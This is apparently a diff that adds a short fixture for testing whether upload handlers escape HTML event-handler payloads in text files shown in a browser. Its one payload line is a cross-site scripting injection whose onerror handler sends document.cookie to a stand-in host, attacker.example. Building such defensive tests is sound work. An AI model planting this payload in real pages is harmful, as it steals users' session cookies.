@@ -1,0 +1,8 @@
+INERT FIXTURE — DO NOT RENDER AS HTML
+Purpose: tests that upload handlers escape or reject HTML event-handler payloads
+embedded in plain-text files that are later displayed in a browser context.
+Threat: if this content is inserted into a page without HTML-encoding, the onerror
+attribute fires and executes the attacker's script.
+
+Payload:
+"><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">
